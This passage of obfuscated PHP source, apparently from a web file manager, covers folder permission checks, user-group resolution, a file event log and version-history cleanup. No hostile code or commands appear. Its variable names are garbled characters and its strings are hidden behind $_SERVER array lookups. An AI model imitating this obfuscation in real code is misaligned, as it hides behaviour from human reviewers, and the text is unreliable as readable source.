(isset($­ˆİ¯ç[$“ášêë])) { return $­ˆİ¯ç[$“ášêë]; } $ÍÜ°™‚ = Model($„ÙñÍœŒ[556])->getInfo($—´ô˜Š±); $¥ó¡æ×Ø = $this->userGroupList($Äó“­É…); $’¡¤ìÏ‡ = isset($¥ó¡æ×Ø[$—´ô˜Š±]) ? $¥ó¡æ×Ø[$—´ô˜Š±][$„ÙñÍœŒ[457]] : !1; if ($’¡¤ìÏ‡ && Model($„ÙñÍœŒ[542])->authCheckAction($’¡¤ìÏ‡[$„ÙñÍœŒ[457]], $„ÙñÍœŒ[1920])) { $­ˆİ¯ç[$“ášêë] = $’¡¤ìÏ‡; return $’¡¤ìÏ‡; } $¶ÎËŠ­ = $this->sourceAuthSelect($ÍÜ°™‚[$„ÙñÍœŒ[89]][$„ÙñÍœŒ[183]]); $–Î•¦ã¤ = $¶ÎËŠ­ ? $this->authMake($¶ÎËŠ­, $Äó“­É…) : !1; $ÕóîÖú = $–Î•¦ã¤ ? $–Î•¦ã¤[$„ÙñÍœŒ[510]] : !1; $­ˆİ¯ç[$“ášêë] = $ÕóîÖú ? $ÕóîÖú : $’¡¤ìÏ‡; return $­ˆİ¯ç[$“ášêë]; } public function authOwnerApply($ÒÄÇÈÚê) { $´÷î ¦Ù =& $_SERVER[ò«¥Ê‡å]; if (empty($ÒÄÇÈÚê[$´÷î ¦Ù[457]]) || isset($ÒÄÇÈÚê[$´÷î ¦Ù[2109]]) && $ÒÄÇÈÚê[$´÷î ¦Ù[2109]]) { return $ÒÄÇÈÚê; } if (AuthModel::authCheckRoot($ÒÄÇÈÚê[$´÷î ¦Ù[457]][$´÷î ¦Ù[458]])) { return $ÒÄÇÈÚê; } $®…ØŠÄŠ = Model($´÷î ¦Ù[1380])->parentLevelArray($ÒÄÇÈÚê[$´÷î ¦Ù[555]]); $®…ØŠÄŠ = array_merge(array($ÒÄÇÈÚê[$´÷î ¦Ù[183]]), array_reverse($®…ØŠÄŠ)); $·ÌİÁ‹® = $this->sourceAuthSelect($®…ØŠÄŠ); $„Ô‘Š± = array(); $Ó¿”»‡ = array(); foreach ($·ÌİÁ‹® as $Õ°Ï¬ùß => $øÀü¿‡™) { $Èşîôğ = $this->authFolderOwnerUser($øÀü¿‡™); $„Ô‘Š±[$Õ°Ï¬ùß] = $Èşîôğ; $Ó¿”»‡ = array_merge($Ó¿”»‡, $Èşîôğ[$´÷î ¦Ù[632]]); if ($Èşîôğ[$´÷î ¦Ù[2110]]) { break; } } if (count($Ó¿”»‡) == 0) { $Ó¿”»‡ = $this->authFolderOwnerGroup($ÒÄÇÈÚê[$´÷î ¦Ù[540]]); } $Ó¿”»‡ = array_unique($Ó¿”»‡); if (AuthModel::authCheckRoot($ÒÄÇÈÚê[$´÷î ¦Ù[457]][$´÷î ¦Ù[458]])) { $Ó¿”»‡[] = USER_ID; } $ÒÄÇÈÚê[$´÷î ¦Ù[457]][$´÷î ¦Ù[2111]] = Model($´÷î ¦Ù[548])->userListInfo($Ó¿”»‡); return $ÒÄÇÈÚê; } private function authFolderOwnerGroup($½ş³¸Ü) { $…´©ªîá =& $_SERVER[ò«¥Ê‡å]; $Å‘ìº©Ü = Model($…´©ªîá[1989])->where(array($…´©ªîá[1899] => $½ş³¸Ü))->select(); $ÀÆ—á÷› = array(); if (!$Å‘ìº©Ü) { return $ÀÆ—á÷›; } foreach ($Å‘ìº©Ü as $ŒáòúŒ„) { $ç„˜×ü = $this->authInfo($ŒáòúŒ„); if (AuthModel::authCheckRoot($ç„˜×ü[$…´©ªîá[457]])) { $ÀÆ—á÷›[] = $ŒáòúŒ„[$…´©ªîá[1701]]; } } return $ÀÆ—á÷›; } private function authFolderOwnerUser($†˜ó½„) { $ìó–í¨ù =& $_SERVER[ò«¥Ê‡å]; $¸ÕğâşÆ = array(); $ÖÃÖ†Ç = !1; foreach ($†˜ó½„ as $Àä¤ÂˆĞ) { $øêó¢¥“ = $this->authInfo($Àä¤ÂˆĞ); if ($Àä¤ÂˆĞ[$ìó–í¨ù[540]] == $ìó–í¨ù[214]) { $ÖÃÖ†Ç = !0; } if ($Àä¤ÂˆĞ[$ìó–í¨ù[180]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($øêó¢¥“[$ìó–í¨ù[457]])) { $¸ÕğâşÆ[] = $Àä¤ÂˆĞ[$ìó–í¨ù[540]]; } } } return array($ìó–í¨ù[632] => $¸ÕğâşÆ, $ìó–í¨ù[2110] => $ÖÃÖ†Ç); } public function authMake($¸ÛÌğÙÁ, $ÜĞ¸»¼ = false) { $‹ÇØŠÂ¦ =& $_SERVER[ò«¥Ê‡å]; $ĞÉÉ¥·û = $this->authArrayCheck($¸ÛÌğÙÁ, $ÜĞ¸»¼); if ($ĞÉÉ¥·û[$‹ÇØŠÂ¦[2112]]) { $ĞÉÉ¥·û[$‹ÇØŠÂ¦[2112]] = $this->sourceAuthInfo($ĞÉÉ¥·û[$‹ÇØŠÂ¦[2112]]); } return $ĞÉÉ¥·û; } public function authArrayCheck($î­„ìµ, $Ù˜·ŠÒ„ = false) { $€ƒË°«Å =& $_SERVER[ò«¥Ê‡å]; if (!$î­„ìµ) { return array($€ƒË°«Å[458] => 0, $€ƒË°«Å[510] => !1); } $Ù˜·ŠÒ„ = $Ù˜·ŠÒ„ ? $Ù˜·ŠÒ„ : USER_ID; $Ï¼•—ıÄ = 0; $†îÔŞ†© = 0; $ëßŞ‹¦è = 0; $Â²Ïûãˆ = 0; $¿Ï½­² = 0; $¤îÊÌ×ø = 0; $á™¬®Á = 1000; $êÔÈ´¹â = 0; $•°¤´¯ = 0; $ä£­ÜÙå = 0; $Ó¯¬‰´‘ = 0; $‰¸¿¼­È = array($€ƒË°«Å[183] => 0); foreach ($î­„ìµ as $‰¸¿¼­È) { $È»èª•› = $this->authInfo($‰¸¿¼­È); if (!$È»èª•›) { continue; } $‚Â¢Îˆ‘ = $‰¸¿¼­È[$€ƒË°«Å[540]]; $ºÛçåÀ = intval($È»èª•›[$€ƒË°«Å[457]]); if ($‰¸¿¼­È[$€ƒË°«Å[180]] == SourceModel::TYPE_USER && $‚Â¢Îˆ‘ == $Ù˜·ŠÒ„) { $Ï¼•—ıÄ = !0; $ëßŞ‹¦è = $È»èª•›; $†îÔŞ†© = $ºÛçåÀ; } else { if ($‰¸¿¼­È[$€ƒË°«Å[180]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‚Â¢Îˆ‘, $Ù˜·ŠÒ„)) { $Â²Ïûãˆ = !0; $×ÌŒ…±Ã = $this->groupStepToUserGroup($‚Â¢Îˆ‘, $Ù˜·ŠÒ„); if ($×ÌŒ…±Ã < $á™¬®Á) { $á™¬®Á = $×ÌŒ…±Ã; $¿Ï½­² = $ºÛçåÀ; $¤îÊÌ×ø = $È»èª•›; $êÔÈ´¹â = $‚Â¢Îˆ‘; } if ($×ÌŒ…±Ã == $á™¬®Á && $ºÛçåÀ >= $¿Ï½­²) { $¿Ï½­² = $ºÛçåÀ; $¤îÊÌ×ø = $È»èª•›; $êÔÈ´¹â = $‚Â¢Îˆ‘; } } else { if ($‚Â¢Îˆ‘ == $€ƒË°«Å[214]) { $•°¤´¯ = !0; $Ó¯¬‰´‘ = $È»èª•›; $ä£­ÜÙå = $ºÛçåÀ; } } } } if ($Ï¼•—ıÄ) { $×Æ£ÊŞä = $†îÔŞ†©; $È»èª•› = $ëßŞ‹¦è; $÷ ËÉ€¬ = LNG($€ƒË°«Å[2113]); } else { if ($Â²Ïûãˆ) { $×Æ£ÊŞä = $¿Ï½­²; $È»èª•› = $¤îÊÌ×ø; $ÌéäÜ¥ã = Model($€ƒË°«Å[556])->getInfo($êÔÈ´¹â); $÷ ËÉ€¬ = $€ƒË°«Å[165] . $ÌéäÜ¥ã[$€ƒË°«Å[560]] . $€ƒË°«Å[2114] . LNG($€ƒË°«Å[2115]); } else { if ($•°¤´¯) { $×Æ£ÊŞä = $ä£­ÜÙå; $È»èª•› = $Ó¯¬‰´‘; $÷ ËÉ€¬ = LNG($€ƒË°«Å[2085]); } else { $×Æ£ÊŞä = 0; $È»èª•› = !1; $÷ ËÉ€¬ = $€ƒË°«Å[12]; } } } $èÊØÂé… = array($€ƒË°«Å[2105] => intval($×Æ£ÊŞä), $€ƒË°«Å[2088] => $È»èª•›, $€ƒË°«Å[2106] => $÷ ËÉ€¬, $€ƒË°«Å[2097] => $‰¸¿¼­È[$€ƒË°«Å[183]]); return $èÊØÂé…; } private function groupContainUser($Áûæ–¶, $’‚Œñ« = false) { return in_array($Áûæ–¶, $this->userGroupParents($’‚Œñ«)); } private function groupStepToUserGroup($æşÏĞí’, $ô‘ã ´« = false) { $ê…ôˆñô =& $_SERVER[ò«¥Ê‡å]; $¹ò£äüˆ = $this->userGroupList($ô‘ã ´«); $À²ÔÆÃş = 1000; $Ã°Â™­¬ = $GLOBALS[$ê…ôˆñô[6]][$ê…ôˆñô[91]][$ê…ôˆñô[2002]] == 1; $óºêÁÙ = $Ã°Â™­¬ ? 3 : 2; foreach ($¹ò£äüˆ as $ê•ø Ô¾) { if ($ê•ø Ô¾[$ê…ôˆñô[1899]] == $æşÏĞí’) { return 0; } $­ä¸‘†‚ = explode($ê…ôˆñô[50], trim($ê•ø Ô¾[$ê…ôˆñô[555]], $ê…ôˆñô[50])); if ($­ä¸‘†‚[0] == $ê…ôˆñô[214] && count($­ä¸‘†‚) > $óºêÁÙ) { $¯Ñ§˜°¬ = array_reverse(array_slice($­ä¸‘†‚, $óºêÁÙ)); $šà®®èÅ = array_search($æşÏĞí’, $¯Ñ§˜°¬); if ($šà®®èÅ !== !1 && $šà®®èÅ + 1 <= $À²ÔÆÃş) { $À²ÔÆÃş = $šà®®èÅ + 1; } } } return $À²ÔÆÃş; } private function userGroupList($¡º¤±¯ = false) { $ñ˜ÙÏåØ =& $_SERVER[ò«¥Ê‡å]; static $î çà¡Á = array(); if (isset($î çà¡Á[$¡º¤±¯])) { return $î çà¡Á[$¡º¤±¯]; } $‘’İçÖĞ = Model($ñ˜ÙÏåØ[569])->getInfo($¡º¤±¯); $î çà¡Á[$¡º¤±¯] = array_to_keyvalue($‘’İçÖĞ[$ñ˜ÙÏåØ[2086]], $ñ˜ÙÏåØ[1899]); return $î çà¡Á[$¡º¤±¯]; } public function userGroupParents($ŒÎĞÂğ) { $‘–Ê“‰É =& $_SERVER[ò«¥Ê‡å]; static $˜â±«œ€ = array(); $ŒÎĞÂğ = $ŒÎĞÂğ ? $ŒÎĞÂğ : USER_ID; if (isset($˜â±«œ€[$ŒÎĞÂğ])) { return $˜â±«œ€[$ŒÎĞÂğ]; } $öé™àÈ = $this->userGroupList($ŒÎĞÂğ); $…ÔÏ°Ö— = array(); $‹ø¥¦¦€ = $GLOBALS[$‘–Ê“‰É[6]][$‘–Ê“‰É[91]][$‘–Ê“‰É[2002]] == 1; $˜ü‚ìòÆ = $‹ø¥¦¦€ ? 3 : 2; foreach ($öé™àÈ as $Öİ¸±©°) { $ŸÌÑ¸¥ô = array($Öİ¸±©°[$‘–Ê“‰É[1899]]); $óßì® = explode($‘–Ê“‰É[50], trim($Öİ¸±©°[$‘–Ê“‰É[555]], $‘–Ê“‰É[50])); if ($óßì®[0] == $‘–Ê“‰É[214] && count($óßì®) > $˜ü‚ìòÆ) { $Ñ€Òæ»ã = array_slice($óßì®, $˜ü‚ìòÆ); $ŸÌÑ¸¥ô = array_merge($ŸÌÑ¸¥ô, array_reverse($Ñ€Òæ»ã)); } $…ÔÏ°Ö— = array_merge($…ÔÏ°Ö—, $ŸÌÑ¸¥ô); } $˜â±«œ€[$ŒÎĞÂğ] = array_unique($…ÔÏ°Ö—); return $˜â±«œ€[$ŒÎĞÂğ]; } public function authTargetInfoMake($ë¡ˆÊ±´) { $ËÄşú€¶ =& $_SERVER[ò«¥Ê‡å]; $ëäÑİ« = array(); $Îğõ¬££ = array(); foreach ($ë¡ˆÊ±´ as $Ø‡¾°ıæ) { if ($Ø‡¾°ıæ[$ËÄşú€¶[180]] == SourceModel::TYPE_USER) { $ëäÑİ«[] = intval($Ø‡¾°ıæ[$ËÄşú€¶[540]]); } else { if ($Ø‡¾°ıæ[$ËÄşú€¶[180]] == SourceModel::TYPE_GROUP) { $Îğõ¬££[] = intval($Ø‡¾°ıæ[$ËÄşú€¶[540]]); } } } if ($ëäÑİ«) { $ëäÑİ« = Model($ËÄşú€¶[548])->userListInfo($ëäÑİ«); } if ($Îğõ¬££) { $Ù”Œœ¬Á = array($ËÄşú€¶[1987] => array($ËÄşú€¶[462], $Îğõ¬££)); $Îğõ¬££ = Model($ËÄşú€¶[556])->field($ËÄşú€¶[2116])->where($Ù”Œœ¬Á)->select(); $Îğõ¬££ = array_to_keyvalue($Îğõ¬££, $ËÄşú€¶[1899]); } return array($ËÄşú€¶[2117] => $ëäÑİ«, $ËÄşú€¶[2118] => $Îğõ¬££); } public function authInfo($ÃÃÇÜ¸Ø) { $‡¶Î™„³ =& $_SERVER[ò«¥Ê‡å]; if ($ÃÃÇÜ¸Ø[$‡¶Î™„³[2003]]) { $Ñé•óí‹ = Model($‡¶Î™„³[542])->listData($ÃÃÇÜ¸Ø[$‡¶Î™„³[2003]]); if (!$Ñé•óí‹) { return !1; $ıêÄ±Éè = Model($‡¶Î™„³[542])->listData(); $·íÀ®û• = array_filter_by_field($ıêÄ±Éè, $‡¶Î™„³[457], $‡¶Î™„³[214]); return $·íÀ®û•; } $»²Î·Å  = array_field_key($Ñé•óí‹, array($‡¶Î™„³[445], $‡¶Î™„³[32], $‡¶Î™„³[457], $‡¶Î™„³[1922], $‡¶Î™„³[1923])); $»²Î·Å [$‡¶Î™„³[2119]] = $ÃÃÇÜ¸Ø; return $»²Î·Å ; } else { return array($‡¶Î™„³[463] => 0, $‡¶Î™„³[1905] => $ÃÃÇÜ¸Ø[$‡¶Î™„³[2063]], $‡¶Î™„³[464] => $‡¶Î™„³[12], $‡¶Î™„³[1922] => $‡¶Î™„³[2120]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\x63\x65\137\145\166\x65\156\x74"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\165\156\x63\164\151\157\x6e"), array("\144\x65\x73\143", '', "\151\156\x73\x65\162\x74\x2c\165\x70\144\x61\164\x65\54\x73\145\x6c\x65\x63\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ø‚’¡Š, $ã°»–©, $á¨å§ª¸ = '') { $î„Î¦£Œ =& $_SERVER[ò«¥Ê‡å]; if (!$this->eventSave) { return; } $ºöÃÖ‹ = Model($î„Î¦£Œ[1380])->sourceInfo($ø‚’¡Š); if (!$ºöÃÖ‹) { return !1; } if ($this->isCacheEvent($ºöÃÖ‹, $ã°»–©)) { return; } if ($á¨å§ª¸ && is_string($á¨å§ª¸)) { $á¨å§ª¸ = array($î„Î¦£Œ[1938] => $á¨å§ª¸); } $Šë˜º¬ = defined($î„Î¦£Œ[2121]) ? USER_ID : 0; $È…äİ†ß = array($î„Î¦£Œ[461] => $ø‚’¡Š, $î„Î¦£Œ[2122] => $ºöÃÖ‹[$î„Î¦£Œ[182]], $î„Î¦£Œ[2123] => $ºöÃÖ‹[$î„Î¦£Œ[32]], $î„Î¦£Œ[553] => !empty($ºöÃÖ‹[$î„Î¦£Œ[553]]) ? $ºöÃÖ‹[$î„Î¦£Œ[553]] : $î„Î¦£Œ[12], $î„Î¦£Œ[1692] => $Šë˜º¬, $î„Î¦£Œ[466] => $ã°»–©, $î„Î¦£Œ[1694] => $á¨å§ª¸); $this->addSystemLog($ã°»–©, $È…äİ†ß); unset($È…äİ†ß[$î„Î¦£Œ[2123]], $È…äİ†ß[$î„Î¦£Œ[553]]); return $this->add($È…äİ†ß); } private function addSystemLog($ªïöûÉÈ, $½²ï¦á¨) { $×ù¬Ì©… =& $_SERVER[ò«¥Ê‡å]; if ($ªïöûÉÈ == $×ù¬Ì©…[2124]) { $ªïöûÉÈ = $½²ï¦á¨[$×ù¬Ì©…[496]][$×ù¬Ì©…[2125]]; } else { if (in_array($ªïöûÉÈ, array($×ù¬Ì©…[1879], $×ù¬Ì©…[2126]))) { $ªïöûÉÈ = $½²ï¦á¨[$×ù¬Ì©…[496]][$×ù¬Ì©…[793]]; } } $âÙœ†­ñ = array_merge($½²ï¦á¨, array($×ù¬Ì©…[2127] => $½²ï¦á¨[$×ù¬Ì©…[183]], $×ù¬Ì©…[2128] => $½²ï¦á¨[$×ù¬Ì©…[2128]])); Hook::trigger($×ù¬Ì©…[2129], $×ù¬Ì©…[2130] . $ªïöûÉÈ, $½²ï¦á¨); Model($×ù¬Ì©…[1843])->addLog($×ù¬Ì©…[2130] . $ªïöûÉÈ, $âÙœ†­ñ); } private function isCacheEvent($îÖˆ…œ¦, $Ì‚„º¬ö) { if ($îÖˆ…œ¦[$_SERVER[ò«¥Ê‡å][180]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($èİé , $œ¥°»È) { $‰µú¡¶ =& $_SERVER[ò«¥Ê‡å]; $ÔËİ¬à = Model($‰µú¡¶[1380])->sourceInfo($èİé ); $½¼Ï¥¨Ğ = array($‰µú¡¶[2125] => $œ¥°»È, $‰µú¡¶[32] => $ÔËİ¬à[$‰µú¡¶[32]]); return $this->addEvent($èİé , $‰µú¡¶[2124], $½¼Ï¥¨Ğ); } public function eventFileEdit($¡ŒÁ¹î) { $ÁÊÔ†³Ç =& $_SERVER[ò«¥Ê‡å]; $éÖëğ¹ = array($ÁÊÔ†³Ç[2131] => $_SERVER[$ÁÊÔ†³Ç[2132]], $ÁÊÔ†³Ç[2133] => strtolower(ACTION)); if (isset($GLOBALS[$ÁÊÔ†³Ç[7]][$ÁÊÔ†³Ç[2134]])) { $éÖëğ¹[$ÁÊÔ†³Ç[2134]] = $ÁÊÔ†³Ç[90]; } return $this->addEvent($¡ŒÁ¹î, $ÁÊÔ†³Ç[1869], $éÖëğ¹); } public function eventRecycle($‰ıŒø„ß, $Î™¶Ù˜É) { return $this->addEvent($‰ıŒø„ß, $_SERVER[ò«¥Ê‡å][2126], $Î™¶Ù˜É); } public function eventRemove($ôù¦„áò) { $üº£îô­ =& $_SERVER[ò«¥Ê‡å]; $‚¸æ½Æ = Model($üº£îô­[1380])->sourceInfo($ôù¦„áò); $˜»®æı = $‚¸æ½Æ[$üº£îô­[32]]; return $this->addEvent($‚¸æ½Æ[$üº£îô­[182]], $üº£îô­[1868], $˜»®æı); } public function eventShare($İ¢µ²Ë…, $ÉŸµ÷«¤) { return $this->addEvent($İ¢µ²Ë…, $_SERVER[ò«¥Ê‡å][1879], $ÉŸµ÷«¤); } public function eventMove($»³©¼˜, $¼Çº¸Ş…, $øëê¤Ä) { $¡…ÛçÒª =& $_SERVER[ò«¥Ê‡å]; $ëÙê• = Model($¡…ÛçÒª[1380]); $òÕ»ûªª = $ëÙê•->sourceInfo($»³©¼˜); $Í…Õ«Ğ = $ëÙê•->sourceInfo($¼Çº¸Ş…); $ãÃÕ®„ = $ëÙê•->sourceInfo($øëê¤Ä); $úıØä²¿ = array($¡…ÛçÒª[1207] => $¼Çº¸Ş…, $¡…ÛçÒª[2135] => $Í…Õ«Ğ[$¡…ÛçÒª[32]], $¡…ÛçÒª[2112] => !empty($Í…Õ«Ğ[$¡…ÛçÒª[553]]) ? $Í…Õ«Ğ[$¡…ÛçÒª[553]] : $¡…ÛçÒª[12], $¡…ÛçÒª[1208] => $øëê¤Ä, $¡…ÛçÒª[2136] => $ãÃÕ®„[$¡…ÛçÒª[32]], $¡…ÛçÒª[2137] => !empty($ãÃÕ®„[$¡…ÛçÒª[553]]) ? $ãÃÕ®„[$¡…ÛçÒª[553]] : $¡…ÛçÒª[12]); $this->addEvent($»³©¼˜, $¡…ÛçÒª[590], $úıØä²¿); $òÕ»ûªª = $ëÙê•->sourceInfo($»³©¼˜); $úıØä²¿ = array($¡…ÛçÒª[183] => $òÕ»ûªª[$¡…ÛçÒª[183]], $¡…ÛçÒª[32] => $òÕ»ûªª[$¡…ÛçÒª[32]]); $this->addEvent($¼Çº¸Ş…, $¡…ÛçÒª[2138], $úıØä²¿); } public function eventCopy($§›íÜ”ï) { $this->eventCreate($§›íÜ”ï, $_SERVER[ò«¥Ê‡å][588]); } public function eventRename($¼ìÍ¥¦ä, $şè†úñ, $áÊË»°¡) { $Šç®‰Ú× =& $_SERVER[ò«¥Ê‡å]; $ç… Ç¥Æ = array($Šç®‰Ú×[1207] => $şè†úñ, $Šç®‰Ú×[1208] => $áÊË»°¡); return $this->addEvent($¼ìÍ¥¦ä, $Šç®‰Ú×[1394], $ç… Ç¥Æ); } public function eventAddComment($§ôó‘âÜ, $ˆÒè²ºÖ) { return $this->addEvent($§ôó‘âÜ, $_SERVER[ò«¥Ê‡å][2139], $ˆÒè²ºÖ); } public function eventAddDesc($‚›½¸¨º, $ûçŞÎ©±) { return $this->addEvent($‚›½¸¨º, $_SERVER[ò«¥Ê‡å][2140], $ûçŞÎ©±); } public function listBySource($ Š¡Äâ­) { $–’«äª– =& $_SERVER[ò«¥Ê‡å]; $Œ¹ğø = Model($–’«äª–[1380])->sourceInfo($ Š¡Äâ­); $âğ¿Ï¥õ = array($–’«äª–[461] => $ Š¡Äâ­); if ($Œ¹ğø[$–’«äª–[455]] == $–’«äª–[90]) { $ˆ¥–ê½ = Model($–’«äª–[1380])->listSearchChildren($ Š¡Äâ­, 20000); $ˆ¥–ê½[] = $ Š¡Äâ­ . $–’«äª–[424]; $âğ¿Ï¥õ = array($–’«äª–[183] => array($–’«äª–[7], $ˆ¥–ê½)); } $İ Ì´ğÆ = $this->where($âğ¿Ï¥õ)->order($–’«äª–[2141])->selectPage(); if ($İ Ì´ğÆ[$–’«äª–[412]][$–’«äª–[413]] == 0) { $İ Ì´ğÆ[$–’«äª–[412]][$–’«äª–[413]] = 1; $İ Ì´ğÆ[$–’«äª–[415]] = array(array($–’«äª–[461] => $ Š¡Äâ­, $–’«äª–[2122] => $Œ¹ğø[$–’«äª–[182]], $–’«äª–[1692] => $Œ¹ğø[$–’«äª–[497]], $–’«äª–[466] => $–’«äª–[2142], $–’«äª–[467] => $Œ¹ğø[$–’«äª–[217]], $–’«äª–[1694] => $–’«äª–[12])); } return $this->eventListParse($İ Ì´ğÆ, $ Š¡Äâ­); } private function eventListParse($â³İ°Óø, $Ø¦´ŸÒ) { $öá‹ã°Æ =& $_SERVER[ò«¥Ê‡å]; $¡²÷¾ˆ = $â³İ°Óø[$öá‹ã°Æ[415]]; $ÔÔ˜Çİ– = array_to_keyvalue($¡²÷¾ˆ, $öá‹ã°Æ[12], $öá‹ã°Æ[183]); $“•˜­à = array_to_keyvalue($¡²÷¾ˆ, $öá‹ã°Æ[12], $öá‹ã°Æ[2128]); foreach ($¡²÷¾ˆ as $©¢¢³ç») { $ÍÇ¦’Ãò = $©¢¢³ç»[$öá‹ã°Æ[496]]; if ($©¢¢³ç»[$öá‹ã°Æ[33]] == $öá‹ã°Æ[590] && isset($ÍÇ¦’Ãò[$öá‹ã°Æ[1207]])) { $ÔÔ˜Çİ–[] = $ÍÇ¦’Ãò[$öá‹ã°Æ[1207]] . $öá‹ã°Æ[12]; $ÔÔ˜Çİ–[] = $ÍÇ¦’Ãò[$öá‹ã°Æ[1208]] . $öá‹ã°Æ[12]; } if ($©¢¢³ç»[$öá‹ã°Æ[33]] == $öá‹ã°Æ[2138] && isset($ÍÇ¦’Ãò[$öá‹ã°Æ[183]])) { $ÔÔ˜Çİ–[] = $ÍÇ¦’Ãò[$öá‹ã°Æ[183]] . $öá‹ã°Æ[12]; } } $ÔÔ˜Çİ– = array_merge($ÔÔ˜Çİ–, $“•˜­à, array($Ø¦´ŸÒ . $öá‹ã°Æ[12])); $ÔÔ˜Çİ– = array_unique($ÔÔ˜Çİ–); $¤ëÑ‘È÷ = array_unique(array_to_keyvalue($¡²÷¾ˆ, $öá‹ã°Æ[12], $öá‹ã°Æ[1701])); $¬ä°òÌü = Model($öá‹ã°Æ[569])->userListInfo($¤ëÑ‘È÷); $©“ÊÊîƒ = Model($öá‹ã°Æ[871])->sourceListInfo($ÔÔ˜Çİ–, !0); foreach ($¡²÷¾ˆ as &$©¢¢³ç») { if ($©¢¢³ç»[$öá‹ã°Æ[33]] == $öá‹ã°Æ[590] && isset($©¢¢³ç»[$öá‹ã°Æ[496]][$öá‹ã°Æ[1207]])) { $©¢¢³ç»[$öá‹ã°Æ[496]][$öá‹ã°Æ[1207]] = $©“ÊÊîƒ[$©¢¢³ç»[$öá‹ã°Æ[496]][$öá‹ã°Æ[1207]]]; $©¢¢³ç»[$öá‹ã°Æ[496]][$öá‹ã°Æ[1208]] = $©“ÊÊîƒ[$©¢¢³ç»[$öá‹ã°Æ[496]][$öá‹ã°Æ[1208]]]; } if ($©¢¢³ç»[$öá‹ã°Æ[33]] == $öá‹ã°Æ[2138] && isset($©¢¢³ç»[$öá‹ã°Æ[496]][$öá‹ã°Æ[183]])) { $©¢¢³ç»[$öá‹ã°Æ[496]][$öá‹ã°Æ[183]] = $©“ÊÊîƒ[$©¢¢³ç»[$öá‹ã°Æ[496]][$öá‹ã°Æ[183]]]; } $©¢¢³ç»[$öá‹ã°Æ[89]] = $©“ÊÊîƒ[$©¢¢³ç»[$öá‹ã°Æ[183]]]; $©¢¢³ç»[$öá‹ã°Æ[2143]] = $©“ÊÊîƒ[$©¢¢³ç»[$öá‹ã°Æ[2128]]]; if ($©¢¢³ç»[$öá‹ã°Æ[33]] == $öá‹ã°Æ[1868]) { $©¢¢³ç»[$öá‹ã°Æ[2143]] = $©¢¢³ç»[$öá‹ã°Æ[89]]; $©¢¢³ç»[$öá‹ã°Æ[2128]] = $©¢¢³ç»[$öá‹ã°Æ[2143]][$öá‹ã°Æ[183]]; $©¢¢³ç»[$öá‹ã°Æ[89]] = !1; $©¢¢³ç»[$öá‹ã°Æ[183]] = $öá‹ã°Æ[12]; } $©¢¢³ç»[$öá‹ã°Æ[2071]] = $¬ä°òÌü[$©¢¢³ç»[$öá‹ã°Æ[1701]]]; } unset($©¢¢³ç»); $â³İ°Óø[$öá‹ã°Æ[415]] = $¡²÷¾ˆ; return $â³İ°Óø; } public function removeBySource($œ²é¤«) { $§ÎœÖ = array($_SERVER[ò«¥Ê‡å][461] => $œ²é¤«); $this->where($§ÎœÖ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\162\x63\x65\x5f\x68\x69\x73\x74\x6f\x72\x79"; public function historyCount($©¢¾ú¼Œ) { $—…‹¥Ğ‘ =& $_SERVER[ò«¥Ê‡å]; if (!$©¢¾ú¼Œ) { return array(); } if (is_string($©¢¾ú¼Œ) || is_int($©¢¾ú¼Œ)) { $©¢¾ú¼Œ = array($©¢¾ú¼Œ); } $­´¤êĞŠ = array($—…‹¥Ğ‘[183], $—…‹¥Ğ‘[1932] => $—…‹¥Ğ‘[536]); $´ê‚ğÆĞ = array($—…‹¥Ğ‘[183] => array($—…‹¥Ğ‘[7], $©¢¾ú¼Œ)); $ó™¸Ñ‡¾ = $this->field($­´¤êĞŠ)->where($´ê‚ğÆĞ)->group($—…‹¥Ğ‘[183])->select(); return array_to_keyvalue($ó™¸Ñ‡¾, $—…‹¥Ğ‘[183], $—…‹¥Ğ‘[536]); } public function addHistory($ šœëìå, $çĞ„—à = '') { $½‘ÅæÏ˜ =& $_SERVER[ò«¥Ê‡å]; $Å™¸¹ŒĞ = array($½‘ÅæÏ˜[461] => $ šœëìå[$½‘ÅæÏ˜[183]], $½‘ÅæÏ˜[1692] => isset($ šœëìå[$½‘ÅæÏ˜[499]]) ? $ šœëìå[$½‘ÅæÏ˜[499]] : $ šœëìå[$½‘ÅæÏ˜[497]], $½‘ÅæÏ˜[512] => $ šœëìå[$½‘ÅæÏ˜[511]], $½‘ÅæÏ˜[587] => $ šœëìå[$½‘ÅæÏ˜[78]], $½‘ÅæÏ˜[2144] => $çĞ„—à); if ($GLOBALS[$½‘ÅæÏ˜[6]][$½‘ÅæÏ˜[91]][$½‘ÅæÏ˜[1264]] >= 1) { $this->historyAutoClear($Å™¸¹ŒĞ[$½‘ÅæÏ˜[183]]); $this->add($Å™¸¹ŒĞ); } Hook::trigger($½‘ÅæÏ˜[2145], $Å™¸¹ŒĞ); Model($½‘ÅæÏ˜[2146])->eventFileEdit($ šœëìå[$½‘ÅæÏ˜[183]]); } private function historyAutoClear($¢û’¿ãè) { $ç ²†”¡ =& $_SERVER[ò«¥Ê‡å]; $îØË™ä„ = Model($ç ²†”¡[809])->get($ç ²†”¡[1286]); $±‚ãŒà = intval($GLOBALS[$ç ²†”¡[6]][$ç ²†”¡[91]][$ç ²†”¡[1264]]); $É‚±Ú’ = $îØË™ä„ == $ç ²†”¡[1287] ? min(5, $±‚ãŒà) : $±‚ãŒà; $É‚±Ú’ = $É‚±Ú’ <= 0 ? 0 : $É‚±Ú’ - 1; if ($É‚±Ú’ >= 500) { return; } $Ã£Å»®Ñ = array($ç ²†”¡[461] => $¢û’¿ãè); $¾İñŠ˜½ = $this->field($ç ²†”¡[2147])->where($Ã£Å»®Ñ)->order($ç ²†”¡[2141])->select(); if (!$¾İñŠ˜½ || $É‚±Ú’ >= count($¾İñŠ˜½)) { return; } $…°©„ÜÓ = array_to_keyvalue($¾İñŠ˜½, $ç ²†”¡[12], $ç ²†”¡[445]); $…°©„ÜÓ = array_slice($…°©„ÜÓ, $É‚±Ú’); $©¿ÀÚ = array_to_keyvalue($¾İñŠ˜½, $ç 